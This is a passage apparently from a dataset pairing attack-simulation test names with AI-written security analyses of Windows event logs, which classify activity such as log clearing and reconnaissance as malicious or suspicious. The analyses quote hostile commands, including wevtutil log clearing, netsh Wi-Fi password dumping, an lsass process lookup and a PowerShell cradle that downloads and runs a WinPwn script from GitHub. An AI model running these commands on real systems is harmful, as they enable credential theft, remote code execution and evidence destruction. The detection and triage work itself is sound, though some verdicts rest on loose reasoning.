   - Multiple 5379 events show failed attempts to access credentials. This could indicate intrusive attempts to harvest credential data or probe the system’s security mechanisms.

4. **Unauthorized Changes:**
   - The execution and subsequent clearing of event logs, particularly security logs, could be indicative of an attempt to hide potentially malicious activities or unauthorized operations by a user.

5. **Use of System Utilities:**
   - Processes like `conhost.exe` and `wevtutil.exe` were frequently spawned with high integrity, by the same user who cleared the logs, suggesting automated or scripted actions.

### Threat Assessment:
- **Log Manipulation:** Clearing of logs, especially security logs, is a tactic commonly associated with malicious actors attempting to erase traces of their activities.
- **Suspicious Scripting:** The PowerShell command hints at its possible use for malicious automation or to conduct actions covertly.
- **Unauthorized Access Attempts:** The credential access failures may hint at brute-force attempts or scripted efforts to access secure information.

### Resolution:
**SUSPICIOUS** - The activities recorded in the logs are not typical for regular system and network administration practices and suggest potentially malicious intent. The clearing of logs and execution of suspicious PowerShell scripts warrant a detailed examination of related systems.

### Recommendations for Further Investigation and Mitigation:
1. **Immediately Review Access Logs:** Identify all actions performed by the `admin_test` account and determine if they align with expected behavior and permissions.
2. **Conduct a Full Forensic Analysis:** Perform a comprehensive forensic analysis on `Server002` to check for any malicious software or indicators of compromise.
3. **Security Audit:** Implement a security audit to ensure accounts and systems have appropriate permissions and are following best practices.
4. **Monitor Network Traffic:** Set up monitoring to detect aberrant activities, especially those originating from the machine in question.
5. **Temporary Account Lock:** Consider temporarily disabling the `admin_test` account pending an investigation, if it does not impact critical operations.
6. **Patch and Update Systems:** Ensure all systems, especially critical ones like PowerShell and system utilities, are up to date with the latest patches and security updates."
Discover Specific Process - tasklist,"### Detailed Analysis of the Logs

Upon review of the provided Sysmon, System, Application, Security, and Windows PowerShell logs, several activities have been observed that could indicate potential malicious intent, specifically log clearance activities and commands associated with reconnaissance tactics.

#### Suspicious/Anomalous Behavior

1. **Log Clearance**: 
   - The `wevtutil.exe` tool, which is known for managing Windows event logs, was executed multiple times to clear logs (as seen in Sysmon events). This activity can be associated with an attempt to hide tracks by deleting crucial logs that could record unauthorised or suspicious activities:
     - Logs indicate clearance activities on channels like `System`, `Security`, and `Windows PowerShell` at around ""2024-10-22 19:24:54"". 
   - Clearing of logs is often a red flag as it typically suggests an attempt to remove traces of malicious activity.

2. **Reconnaissance Activity**:
   - Use of commands that list processes (`tasklist`) and search for specific services like `lsass`. These commands are indicators of reconnaissance activities, often preceding credential dumping attempts:
     - As seen in the Sysmon log, there is a `cmd.exe` process running `tasklist` piped with `findstr` to search for `lsass`, a known method for attackers to find processes for potential exploitation.

3. **Time Modification**:
   - There are events associated with system time changes in the logs (Security Events 4616). This can be suspicious if not part of routine operations as attackers might manipulate timestamps to confuse incident responders.

#### Assessment of Malicious Activity

Based on the investigation of the logs:

- **Time Changes**: While time changes alone can occur due to legitimate synchronization operations, the presence of log clearance and reconnaissance commands heightens the suspicion.
  
- **Wevtutil Usage**: The frequent and sequential clearing of multiple Windows logs suggests an attempt to cover tracks which aligns with common attack methodologies.

- **Reconnaissance Commands**: The chaining of `tasklist` and `findstr` commands targeting `lsass` can be a precursor to exploring weak points in the system for privilege escalation or credential theft.

### Threats and Risks Identified

- **Potential Compromise**: The combination of log clearance and reconnaissance activities presents a risk of compromise, either ongoing or an attempt that was underway.

- **Hide Tracks**: The clearing of logs indicates a possible intrusion with an attempt to hide tracks, which is a technique often used by malicious actors post-exploitation.

### Guidance on How to Proceed

1. **Immediate Review**: Conduct a full scan of the system using trusted antivirus and anti-malware solutions to check for further malicious indicators.
   
2. **Audit Security Policies**: Review and audit current security policies, ensuring logging configurations are set to offload logs in real-time to a centralized system for forensic purposes.

3. **User Activity Review**: Investigate user `admin_test` for any deviations in behavior or unauthorized permissions. 

4. **System Hardening**: If not already in place, ensure that system event logs are regularly archived and protected against unauthorized tampering.

5. **Implementation of Monitoring Tools**: Deploy security information and event management (SIEM) solutions for real-time monitoring and analysis of events across networks.

### Final Resolution
Based on the analyzed activities within the logs, the resolution for this investigation is **MALICIOUS**. The observed behaviors strongly indicate activities consistent with a security breach attempt, notably due to log clearance, indication of reconnaissance, and potentially unauthorized modifications to system time."
SharpHound3 - LocalAdmin,"After reviewing the provided logs, several indicators suggest potentially malicious activity, which deserves careful consideration:

**1. Log Clearing Events:**
- Multiple `wevtutil.exe` commands were executed to clear different event logs (Security, System, Application, Windows PowerShell, and Sysmon logs). 
- Event ID `1102` in the Security log and Event ID `104` in the System log confirm that these logs were cleared by the user `admin_test`.
- Wevtutil is used to manage event logs but is unusual in regular administrative activity to see them being cleared without a proper reason or explanation in close succession.

**2. Use of SharpHound via PowerShell:**
- The PowerShell logs and Sysmon logs show the use of the SharpHound tool (`SharpHound.exe`) via a PowerShell script. SharpHound is commonly associated with the BloodHound tool used in Active Directory enumeration and is often used in red teaming and malicious reconnaissance.
- The command line used indicates an effort to collect information about local administrators (`--CollectionMethod LocalAdmin`) using SharpHound, suggesting possible reconnaissance activity.

**3. Privilege Escalation and Suspicious Process Execution:**
- Event ID `4672` highlights high-level privileges (such as `SeDebugPrivilege`, `SeTcbPrivilege`, and `SeSecurityPrivilege`) being granted, and such privileges are often leveraged during attacks for privilege escalation.
- The combination of sysmon Process Creation events indicates execution of system management tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` from directories within a user context rather than expected operational frameworks.

Given these details, the logs present a coherent narrative of potentially unauthorized activity aimed at reconnaissance and covering traces. Thus, the appropriate resolution for this set of logs is:

**MALICIOUS**

**Guidance on Proceeding:**
- It is crucial to isolate `Server002` from the network to prevent further unauthorized activities.
- Conduct a full forensic analysis on the system to understand the extent of the compromise and determine whether additional systems have been affected.
- Review user permissions and ensure that administrative access is restricted to authorized personnel.
- Rebuild systems from backups if necessary, applying this to other systems within the network if the breach has been extensive.
- Review and improve security monitoring and response measures to promptly detect and handle future threats."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Upon reviewing the provided event logs from the Windows host, several suspicious and potentially malicious activities have been identified. Here's a breakdown of the concerning events:

1. **Time Change Events (EventID 4616 & 1):**
   - There are back-to-back changes in the system time recorded at 09:11:11, specifically within milliseconds of each other. This might indicate an attempt to manipulate time stamps or disrupt logging continuity.

2. **Events Related to High Privilege Account `admin_test`:**
   - EventID 4672 shows `admin_test` receiving a large set of privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeImpersonatePrivilege`. While not inherently malicious, the specific combination and sequence of events are unusual, especially when paired with following activities.
   - EventID 1102 in the Security log indicates the security log was cleared by `admin_test`, which is a strong indicator of potential malicious activity aimed at covering tracks.

3. **Events Involving `wevtutil.exe`:**
   - Multiple `wevtutil.exe` command executions (Sysmon logs) to clear logs in different channels (Application, Security) by `admin_test`. Clearing logs, especially by a non-system process, is a typical tactic used by an attacker to erase forensic evidence.

4. **Execution of Suspicious Command:**
   - Sysmon Log with Process `cmd.exe` executing the command `netsh wlan show profile * key=clear` (EventID 1) can be malicious because it is used to retrieve stored Wi-Fi credentials, potentially indicating data exfiltration intentions.

5. **Process Creation Related to Windows Update and Defender:**
   - Creation of typical processes like `wuauclt.exe` or `MpSigStub.exe`. However, these events appear normal in the context of a system getting updated (EventID 44, 43, and 19) and do not present immediate evidence of compromise.

**Assessment and Recommendations:**

- **Assessment:** The logs contain evidence of suspicious and likely malicious activity. Specifically, the clearing of event logs right after elevated privileges are granted to `admin_test` and the execution of `netsh` command by `cmd.exe` are critical indicators. This points toward an attempt to erase activity footprints and possibly access sensitive configurations or data.
  
- **Recommendations:**
  - Conduct a thorough audit and investigation of the user `admin_test` for unauthorized activities or a potential compromise of credentials.
  - Review the system for unauthorized or recently modified account permissions, particularly for any accounts with unusual privilege sets.
  - Deploy a comprehensive security scan and integrity check on `Server002` for malicious processes/scripts.
  - Increase monitoring and establish alerting for any time manipulation and log clearance events.
  - Consider taking the system offline for a detailed forensic analysis to prevent further potential data loss or system compromise.

**Final Resolution: MALICIOUS** - The identified actions, specifically the log clearing and suspicious command executions, demonstrate clear malicious intent."
Security Software Discovery - Sysmon Service,"After thoroughly inspecting the provided Windows event logs, the primary observations are as follows:

### Suspicious and Anomalous Activities:

1. **Event Log Clearing:**
   - The `Microsoft-Windows-Eventlog` event logs indicate that logs in multiple channels (Security, System, and Windows PowerShell) were cleared by the user `SERVER002\admin_test`. The specific events here are Event ID 1102 in the Security log and Event ID 104 in the System log. The act of clearing logs is often an indication of an attempt to cover tracks, especially if there is no legitimate reason for an administrator to perform this action.

2. **Use of `wevtutil.exe`:**
   - The Sysmon logs indicate multiple instances of `wevtutil.exe` being used to clear logs from different channels, including Sysmon, Application, System, and Security logs. This is consistent with the activity of clearing event logs.

3. **Command-Line Execution:**
   - The command-line observed for `cmd.exe` includes `cmd.exe /c fltmc.exe | findstr.exe 385201`, which appears unusual. The sequence of executing `fltmc.exe` with a `findstr` check implies possible reconnaissance or system inspection commands that might hint at unauthorized activities.

4. **Time Change Events:**
   - The Security log captures Event ID 4616, indicating a system time change associated with `svchost.exe`. Although changing time could have legitimate reasons, it coupled with log clearance, might be part of a potential malicious strategy to confuse log timelines.

### Assessment:

- **Indicators of Malicious Activity:**
  - The combination of manually clearing event logs, coupled with unusual command-line activity and process executions, strongly points towards actions taken potentially to hide unauthorized or potentially malicious activity.
  - These logs do not directly capture payload execution or external communications which conclusively point to malware deployment, but they strongly suggest activities typically associated with unauthorized access or insider threats.

### Resolution:

- **MALICIOUS:**
  - The deliberate clearing of logs across multiple important channels and the use of potentially suspicious command-line operations strongly support the classification of this activity as malicious.
 
### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate `Server002` from the network to prevent potential lateral movement.
   - Perform a forensic analysis on `Server002` to identify the root cause and any malicious payloads that might have been executed.
   - Investigate user account `admin_test` for unauthorized actions, including reviewing user permissions and password modifications.
   - Review changes in system configurations, especially related to time settings, to understand the context behind time modification events.

2. **Longer-term Measures:**
   - Implement strict logging and monitoring policies to prevent unauthorized log clearance in the future.
   - Educate users and administrators on security best practices to reduce the risk of insider threats.
   - Consider using Enhanced Threat Detection tools that can help in early detection of such suspicious activities.

Remote System Discovery - net group Domain Controller,"After analyzing the provided Windows event logs, several suspicious indicators suggest potential malicious activity:

1. **Log File Clearing:** 
   - The logs show multiple instances of logs being cleared: Logs from the System, Security, and Windows PowerShell channels were cleared (Event ID 104 and 1102). This is generally considered suspicious behavior, often associated with attempts to cover tracks or conceal malicious activities.

2. **Usage of **Wevtutil.exe**: 
   - The Sysmon logs indicate the execution of `wevtutil.exe` with the `cl` (clear) argument, which corresponds to the clearing of logs. The command `wevtutil.exe cl ""System""` and its execution at around the same time aligns with the log-clearing events in the System log.

3. **Process Activity:**
   - Several processes (`whoami.exe`, `cmd.exe`, `net.exe`, `net1.exe`) executed under a high-integrity context by `admin_test`. The use of `cmd.exe` followed by `net group /domain ""Domain controllers""` is particularly concerning as it suggests an attempt to enumerate domain controllers, which may indicate reconnaissance activities typically associated with unauthorized access or lateral movement within a network.

4. **Combination of Events**:
   - The combination of log-clearing, enumeration commands (`net group`), and running processes (`wevtutil.exe`) with high privileges indicates attempts to gather information or make changes potentially without detection.

**Threats or Risks Identified:**
- The activities suggest potential illicit behavior such as privilege abuse, reconnaissance, and possible preparation for further exploitation or lateral movement.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Investigate the user `admin_test` and verify their recent activities, permissions, and access patterns.
   - Perform a thorough forensic analysis of the host and surrounding systems to identify any unauthorized access, changes, or data exfiltration.

List Google Chrome - Opera Bookmarks on Windows with powershell,"Based on the analysis of the provided Windows event logs, the following findings and assessments have been determined:

### Suspicious Activities:

1. **Clearing of Logs:**
   - Multiple events indicate that logs from different channels (System, Windows PowerShell) were cleared. This action is associated with the EventID 1102 in the Security log and EventID 104 in the System log, typically indicating an attempt to cover up activity. This is commonly suspicious activity if not associated with a legitimate administrative task.

2. **Execution of `wevtutil`:**
   - The `wevtutil` command was executed multiple times to clear the event logs, as evidenced by entries showing `wevtutil.exe` processes with command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`. This is consistent with attempts to clear logs programmatically.

3. **PowerShell Activity:**
   - A suspicious PowerShell command `Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force` is observed. This command attempts to recursively gather potentially sensitive information (like browser bookmarks), which may suggest data enumeration or exfiltration attempts.

4. **Privilege Usage:**
   - Several entries regarding privilege escalation, EventID 4672, indicate the use of high-level privileges. While this might occur legitimately, its occurrence around the time of suspicious activity suggests potential abuse.

5. **Time Discrepancies:**
   - There is evidence of time manipulation or unusual system time changes, which can complicate the detection of malicious activity. Events related to time changes (EventID 4616) were noted, potentially indicating tampering to mislead log analysis.

### Malicious Activity:

- The clearing of logs combined with suspicious PowerShell activity that queries user data indicates potential malicious intent.

### Resolution:
**MALICIOUS**

The findings suggest that the system logs were intentionally cleared, data enumeration was attempted using PowerShell, and this aligns with behaviors commonly associated with malicious activity. The combination of events such as log clearing via `wevtutil.exe`, PowerShell data enumeration, and privilege escalation indicates a substantial risk of compromise.

### Guidance:

1. **Immediate Investigation:**
   - Investigate the user account `'admin_test'` for unauthorized logins or privilege escalation.
   - Conduct a thorough forensic analysis of the system to determine the extent of potential data access and exfiltration.

2. **Monitor and Secure:**
   - Continuously monitor for further suspicious activities from the affected host.
   - Enhance security measures, including more verbose logging and possibly implementing a SIEM solution for real-time detection.

3. **Incident Response:**
   - Engage the incident response team to handle the potential security breach.
   - Review and update incident response procedures to ensure rapid detection and response in the future.

Given the indicators of compromise found in the logs, this situation must be treated with high priority to mitigate further risk."
Adfind -Listing password policy,"Based on an analysis of the provided Windows event logs, the following observations and interpretations can be made:

### Analysis:

#### **1. Event Log Clearing:**
- **System Log (EventID 104):** Multiple logs indicate clearing actions executed by the user `admin_test` on different log channels including `System`, `Security`, and `Windows PowerShell`.
- **Security Log (EventID 1102):** Log clearance event indicates the clearing of security logs around the same time.

**Interpretation:** 
Clearing logs can be an indicator of malicious behavior, as attackers often perform this action to cover their tracks post-compromise.

#### **2. Process Executions and Command-line Usage:**
- **Sysmon Logs:** There are multiple entries for `wevtutil.exe` process executions with the `cl` (clear) command line argument, executed by `SERVER002\admin_test`, targeting critical logs like `System`, `Security`, and `Windows PowerShell`.
- **Odd Command Executions:** The execution of `cmd.exe` invoking `AdFind.exe` with arguments to query domain policies is noted. This tool is often used by attackers for Active Directory reconnaissance.

**Interpretation:** 
The execution of `wevtutil.exe` to clear logs is suspicious and, in conjunction with the logging clearing actions, it strengthens the notion of potential malicious activity. The `AdFind.exe` execution suggests reconnaissance activities typical of a compromised environment.

#### **3. Privilege Escalation and Unusual Privileges:**
- **Security Log (EventID 4672):** Privileged logon session indicated elevated privileges with a comprehensive set of rights, which includes SeDebugPrivilege, a typical privilege that attackers abuse to perform advanced attacks.

**Interpretation:** 
The presence of a privileged session indicates a potentially sensitive operation or possible exploitation by an attacker.

#### **4. Microsoft Edge Update Executions:**
- Multiple processes related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) are seen running. These are benign activities if they correlate with scheduled updates or user-initiated actions. However, persistent unusual updating could warrant further scrutiny.

**Interpretation:** 
While the Edge update processes seem benign, their frequent occurrence combined with the other suspicious activities could suggest additional context to examine.

### Assessment:
The logs present a series of coordinated activities that include log clearance, process executions using administrative privileges, and potential reconnaissance, all of which align with tactics an attacker might employ post-compromise to maintain persistence and evade detection.

### Conclusion: **MALICIOUS**
The combination of log clearance actions, usage of tools for Active Directory reconnaissance, and privilege escalations presents a strong indication that this system has been compromised.

### Guidance on How to Proceed:

Based on the events and the evidence of potentially malicious activity, these logs indicate a security breach or malicious activity. A coordinated response is essential to prevent further damage and to understand the full scope of the breach."
Process Discovery - Process Hacker,"### Detailed Analysis

Upon careful examination of the provided Windows event logs across various categories, several notable activities have been identified that may indicate potentially suspicious or malicious behavior. Let's discuss each log type:

#### Windows PowerShell Log
- **Process Execution**: The logs show repeated execution of the PowerShell command hosting Process Hacker. This application is a known advanced process management utility that can be used for legitimate administrative tasks, but it can also be abused by malicious actors to bypass security controls, manipulate processes, and observe system operations. This command execution could be indicative of malicious intent if it was not authorized or expected.

#### System Log
- **Log File Clearing**: The logs indicate that an admin account named `admin_test` cleared the logs for both the `System` and `Windows PowerShell` channels. This action is a common technique used by attackers to cover their tracks after malicious activity, as it helps in hiding what actions were performed or what occurred prior.

#### Security Log
- **Log File Clearing**: Similarly to the System log, a log file clearing event is observed for the `Security` channel by the same `admin_test` user. This further supports the hypothesis of an attempt to obfuscate activities from log analysis, suggesting an attempt to erase evidence of a breach or other unauthorized actions.

#### Sysmon Log
- **Use of Sysinternals and System Utilities**: The Sysmon logs reveal the widespread use of native Windows executables (`wevtutil.exe`, `hostname.exe`, `whoami.exe`, `SecureBootEncodeUEFI.exe`) along with `process hacker` via PowerShell. While each tool can be used in routine administrative operations, the combination and timing together with the log clearing are suspicious.
- **Repeated Execution of Eventing Utility (wevtutil.exe)**: The frequent execution of `wevtutil.exe` to clear logs is suspicious and aligns with known malicious practices of erasing event logs to hide an intrusion.
- **Presence of ‘System’ Integrity Level**: The execution of certain processes under `NT AUTHORITY\\SYSTEM` indicates a high level of access, possibly a privilege escalation tactic if these were not part of expected administrative activities.

### Assessment and Conclusion
Based on the above findings, there are clear indicators of suspicious and potentially malicious activities:
- The combination of PowerShell commands invoking process manipulation tools.
- Log clearing events across multiple channels conducted by an administrative account, which is a strong sign of an attempt to avoid detection.

### Recommendation
1. **Resolution**: MALICIOUS
   - The actions observed are consistent with malicious activity patterns, particularly in attempts to conceal malicious behavior by log manipulation and use of potentially dual-purpose tools like Process Hacker.
   
2. **Immediate Actions**:
   - Isolate the affected host `Server002` from the network to prevent further potential damage or data exfiltration.
   - Conduct a comprehensive review of other logs and system changes for additional indicators of compromise.
   - Verify the legitimacy and level of administrative access of `admin_test`. This might involve reviewing access control and permissions.
   - Evaluate the current security posture and investigate any unauthorized use of administrative tools or escalation of privileges.
   - Inform relevant stakeholders and prepare for a possible incident response process, which may include contacting impacted users or regulatory bodies if necessary.

3. **Further Response**:
   - Implement enhanced monitoring on similar hosts across the network.
   - Review patch levels, security configurations, and the effectiveness of endpoint protection tools.
   - Consider conducting an organization-wide incident response to detect additional potential threats or actors. Engage threat intelligence resources to understand the broader context or specifics of the threat actor behavior.

This analysis should provide sufficient basis to classify the activities and take corrective actions to secure the system and evaluate further preventative steps."
Network Share Discovery PowerShell,"Upon reviewing the provided logs, the following analysis has been conducted:

**System and Security Logs:**

- **Event ID 104 (Microsoft-Windows-Eventlog):** The event indicates that the system log and Windows PowerShell log have been cleared by a user named ""admin_test."" Clearing event logs can be a tactic used by malicious actors to cover their tracks.
  
- **Event ID 1102 (Microsoft-Windows-Eventlog):** This event indicates that the security log was cleared around the same time as the other log files. Log clearing, especially of security logs, is often associated with illicit activities.

**PowerShell Logs:**

- **PowerShell Activity:** The usage of PowerShell with the command `{get-smbshare}` is logged but seems benign on its own. However, it might be related to data reconnaissance in a broader context.

**Sysmon Logs:**

- **Process Activity (wevtutil.exe):** Multiple instances of `wevtutil.exe`, the Eventing Command Line Utility, are observed clearing logs using the ""cl"" (clear log) command in a short time span. This supports the event log clearance noted in the System and Security logs.
  
- **MicrosoftEdgeUpdate.exe Processes:** Numerous legitimate processes related to Microsoft Edge updates are observed. Activity involving `MicrosoftEdgeUpdate.exe` appears to be routine based on the provided details.

**Assessment:**

- The systematic clearing of logs by the ""admin_test"" account is conspicuous and uncharacteristic of standard administrative tasks unless specifically justified for maintenance or compliance reasons.
- `wevtutil.exe` used to clear multiple logs consecutively is an indicator of potential log tampering, which is a common practice in malicious activities.

**Resolution: SUSPICIOUS**

- The activity of clearing important logs without a clear operational reason is unusual and considered suspicious. Further investigation is required to determine whether these actions were authorized and benign or part of a potential compromise.

**Guidance on How to Proceed:**

1. **User Verification:** Verify with IT and administrative teams if the log-clearing actions by ""admin_test"" were scheduled or if there was an approved reason. If not, this warrants further investigation.
   
2. **Audit Access Permissions:** Check the permissions and account activities of ""admin_test"" to ensure there is no unauthorized access or compromise.
   
3. **Behavioral Monitoring:** Implement enhanced monitoring for ""admin_test"" and associated systems to detect anomalous or unauthorized behavior in real time.
   
4. **Security Teams Notification:** Inform the broader security team and consider an internal investigation to analyze endpoint security logs for any additional indicators of compromise or related activities."
WinPwn - RBCD-Check,"Upon analyzing the provided logs, several suspicious activities stand out, indicative of potentially malicious behavior:

1. **Process Execution Analysis:**
   - Multiple instances of the `whoami.exe`, `wevtutil.exe`, and `conhost.exe` are executed. While these utilities are legitimate, repeated instances, especially within a short timeframe, can be indicative of enumeration activities often used by attackers.
   - Notably, `wevtutil.exe` is used to clear event logs (Sysmon/Operational, Application, Security). Clearing logs is common in an attempt to cover tracks after unauthorized activities.
   - The execution of `whoami.exe` and `hostname.exe` following `wevtutil.exe` may be part of the same tactic to gather more system information.

2. **PowerShell Activity:**
   - A significant red flag is raised by the execution of PowerShell with a script sourced from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). The use of `iex(new-object net.webclient).downloadstring(...)` indicates an attempt to execute potentially malicious scripts directly from the internet, leveraging PowerShell's capabilities. This is a common technique in exploitation frameworks to execute arbitrary code.
   - `RBCD-Check` suggests a focus on assessing and possibly exploiting Resource-Based Constrained Delegation, a known method for privilege escalation in Active Directory environments.

3. **Security and System Log Clearing:**
   - The clearing of security event logs (`EventID 1102`) is highly indicative of malicious intent, as this typically implies an attempt to erase traces of unauthorized actions.

4. **Privileges and User Context:**
   - The user `admin_test` is involved in these activities with a high integrity level, indicating they had elevated privileges, further solidifying the risk and potential malicious conduct.

**Assessment:**
- The presence of repeated enumeration commands, PowerShell downloading and executing scripts from an external repository, and attempts to clear logs collectively point to malicious activity. These actions align with behaviors observed during the lateral movement, persistence, and defense evasion phases of a cyberattack.

**Recommendation:**
- Immediate containment measures, such as isolating the affected host (Server002), should be applied to prevent further spread.
- Conduct root-cause analysis to determine how the system was initially compromised.
- Review access logs and user activity for admin_test account and any other accounts from external IP addresses.
- Implement monitoring for unusual PowerShell activities, especially those involving internet resources.
- Enhance security measures, including endpoint protection updates, and educate users about the risks of running scripts from untrusted sources.

**Resolution:**
- MALICIOUS: The logs contain clear indicators of malicious activity. The likelihood of unauthorized access and intentions to evade detection merit this classification and demand swift response actions."
Remote System Discovery - net,"Upon reviewing the provided logs, several key points stand out that may indicate suspicious activity:

### Suspicious Activities:
1. **Event Log Clearing:**
   - **Events 104 and 1102** in the System and Security logs, respectively, indicate that log files were cleared by the user `admin_test` (Event IDs 3563, 3564, and 30334). This action is suspicious, especially because it happened in quick succession and often is a tactic used by attackers to hide malicious footprints.

2. **Time Manipulation:**
   - **Event ID 4616** in the Security logs indicates a change in system time (Event Record IDs 30335 and 30336). Manipulating the system time can be a tactic to evade detection measures that rely on timestamps, such as log analysis systems.

3. **Process Execution:**
   - The execution of `wevtutil.exe` (System event 17927) and other instances via command line to clear logs is highly unusual if not typically performed during regular maintenance tasks which should be logged and authorized.

4. **Privileged Logons:**
   - Event IDs **4672** and **4624** show multiple privileged logins using NTLM authentication with high privileges assigned to user `admin_test`, which happened almost simultaneously with log clearing events. The logon type was ""Network"" (Logon Type 3) from a remote workstation (`DESKTOP-3HL5B2P`), which might be unexpected for administrative operations.

5. **Process Execution Logs:**
   - There are multiple instances of `whoami.exe` and `cmd.exe` usage, which could indicate enumeration activities or script execution that might be a part of reconnaissance or lateral movement attempts.

6. **Scheduled Tasks:**
   - The presence of `taskhostw.exe` processes (Event 17954) suggests scheduled tasks were running, though without additional context, it’s hard to attribute this directly to malicious activity.

7. **Network Commands:**
   - The `cmd.exe` command executing a disguise net view command through scripts (Event ID 17951), suggesting network reconnaissance.

### Conclusion:

Based on the evidence, the activities observed in these logs are **SUSPICIOUS**. There's clear evidence of event log tampering, system time manipulation, and privileged access likely not attributed to routine or benign administrative actions. These signs point toward a potential compromise or malicious use of the `admin_test` user account.

### Recommendations:
1. **Immediate Investigation:**
   - Conduct a thorough investigation of the user account `admin_test`, particularly focusing on recent activities, authentication attempts, and access logs from `DESKTOP-3HL5B2P`.
2. **Log Retention and Monitoring:**
   - Implement or improve log retention policies to ensure logs are not easily cleared without detection. Implement real-time monitoring to alert on such events.
3. **Review Network and System Configuration:**
   - Verify the configuration and access permissions, especially regarding administrative shares and such remote accesses.
4. **Forensic Analysis:**
   - Consider a deeper forensic analysis of the impacted systems to identify potential malware or unauthorized tools.
5. **Patch Management and Updates:**
   - Ensure that all systems are up to date with the latest patches, particularly focusing on vulnerabilities related to credential abuse and log manipulation.

These steps aim to uncover further evidence of compromise and help prevent potential future attacks."
Enumerate logged on users via CMD (Local),"### Detailed Analysis:

The provided logs display a series of events from Sysmon, Security, Application, and System logs on a Windows host. Certain elements stand out that warrant discussion.

#### Anomalous Behavior:
- **Repeating Use of `wevtutil`**: The logs show repeated execution of `wevtutil.exe` with different log channels such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. The utility is typically used for managing Windows Event logs, including clearing them, which can be suspicious if done unnecessarily or repeatedly.
  
- **Clearing of Event Logs**: The Security and System logs indicate that logs were cleared around the same time:
  - **Security Log ID 1102**: Shows that the Security event log was cleared by user `admin_test`.
  - **System Log ID 104**: Similar entries for System and Windows PowerShell event log clearance are present.

- **Execution by an Administrative Account**: The account `SERVER002\\admin_test` is shown executing these commands with high integrity level, indicative of administrative privileges. The clearing of logs by admin accounts is a known tactic to cover tracks.

- **Time Change Events**: The System log indicates a slight shift in system time. Log tampering tactics often include time modifications as part of covering tracks, though it’s unclear if this is intentional.

#### Indicators of Potential Malicious Activity:
- **Repeated Log Clearing**: The simultaneous and repeating occurrence of log clearance across multiple log types is concerning for potential malicious activity. This behavior is commonly associated with attempts to erase evidence of an attack or unauthorized modifications.

- **Use of Common Administrative Tools**: Using `wevtutil` and `cmd.exe` to query user information is not inherently malicious; however, in context with log clearance, it strengthens the suspicion of unauthorized access and malicious intent.

#### Missing Context:
- **Absence of PowerShell Logs**: There is an absence of PowerShell activity logs, despite indications of log clearance related to PowerShell, which raises questions about activity potentially being removed.

### Final Assessment:

Based on the behavior observed in the logs—particularly the repeated clearing of logs across multiple channels by an administrative user, combined with the usage of system utilities in a manner typical of track-covering—the activity is consistent with an intrusion attempting to remain hidden.

### Resolution: 

**MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected host, `Server002`, from the network to prevent further compromise and data exfiltration.
2. **Forensic Analysis**: Engage in a detailed forensic analysis to recover deleted or modified event data and identify further indicators of compromise.
3. **Review and Audit**: Conduct a thorough review of user accounts, focusing on `admin_test`, to ensure no unauthorized or suspicious configurations exist.
4. **Increase Monitoring**: Increase logging and monitoring on critical systems, and implement measures to alert on future unauthorized event log clearing or suspicious activity.
5. **Patch and Security Updates**: Ensure all systems are updated with the latest security patches and review system configurations to close potential attack vectors.

By taking these steps, the potential malicious actors' impact can be mitigated and prevent such incidents in the future."
MSFT Get-GPO Cmdlet,"After closely analyzing the provided log entries, I have identified several significant observations that could indicate suspicious or potentially malicious activity:

1. **Process Execution and Command-line Activity:**
   - The logs show `wevtutil.exe` being executed multiple times with the command-line argument `cl`, which is used to clear event logs for different channels (Sysmon, Application, System, Security). This is an unusual activity for a typical user and is often associated with attempts to cover tracks after a compromise.
   - The `hostname.exe`, `whoami.exe`, and `powershell.exe` processes execution under `SERVER002\admin_test` suggest enumeration activities typically associated with external actors gathering system information.

2. **Log Clearance Activity:**
   - The `Security` log clearly indicates an Event ID 1102, which shows that the Security log was cleared by the user `admin_test`. This behavior is highly suspicious as clearing security logs is often an action taken by an attacker to hide malicious activities.

3. **PowerShell Activity:**
   - The PowerShell logs display command execution via PowerShell that captures some environmental details and attempts to execute a Group Policy Object (GPO) query with the result directed to a temporary file. This is an unusual practice for regular administrative tasks and could indicate data gathering or reconnaissance by an adversary.
   
4. **Integrity Context:**
   - The processes associated with these suspicious activities run with a High integrity level, indicating administrative privileges. This context is concerning as it implies the actions were performed with elevated privileges, facilitating system-wide impacts.

5. **Execution Timeline:**
   - The timeline of activities, especially the rapid sequence of log clearance across multiple channels, further underscores the likelihood of malicious intent behind these actions.

### Final Assessment:
Based on the suspicious behavior identified, including event log clearance, usage of enumeration commands, and the context of process execution, there are strong indicators suggesting that these logs contain potential malicious activity. The activities noted do align with common tactics, techniques, and procedures (TTPs) utilized by adversaries:

- **Resolution: MALICIOUS**

### Guidance and Next Steps:
- **Immediate Response:**
  - Isolate the host `Server002` from the network to prevent further spread of potential compromise.
  - Conduct a full forensic analysis of the host to confirm the scope of any intrusion and gather evidence.
- **Further Investigation:**
  - Evaluate other systems for similar patterns of activity, especially those involving the `admin_test` account.
  - Check for unauthorized user accounts or changes made to existing accounts.
 
- **Remediation Efforts:**
  - Reset credentials for accounts showing suspicious activities and review permissions assignments.
  - Enhance logging and monitoring to provide better visibility into administrative activities.
  - Consider employing advanced detection tools to provide additional insights into ongoing or past occurrences.

Such suspicious and unauthorized activities, especially the clearing of logs and the enumeration through PowerShell, should prompt a comprehensive security review and an in-depth investigation."
Enumerate Windows Security Log via WevtUtil,"Upon reviewing the provided Windows event logs, here is a detailed analysis identifying indicators that may suggest potential malicious activity:

### Analysis:

1. **EventID 1102 (Security Log Cleared):**
   - **Timestamp:** 2024-10-28 17:02:42
   - **User:** `admin_test`
   - **Details:** The security event log was cleared. This is often a red flag, as threat actors may clear logs to hide malicious activity. This action was performed using the `wevtutil` command, which is typical for log manipulation.

2. **EventID 4672 and 4624 (Special Privileges & Logon):**
   - **Timestamp:** 2024-10-28 17:02:41
   - **User:** `admin_test`
   - **Privileges:** The user `admin_test` received a list of special privileges, including `SeDebugPrivilege`, which allows a user to debug processes. This can be used for privilege escalation or conducting unauthorized actions on a system.
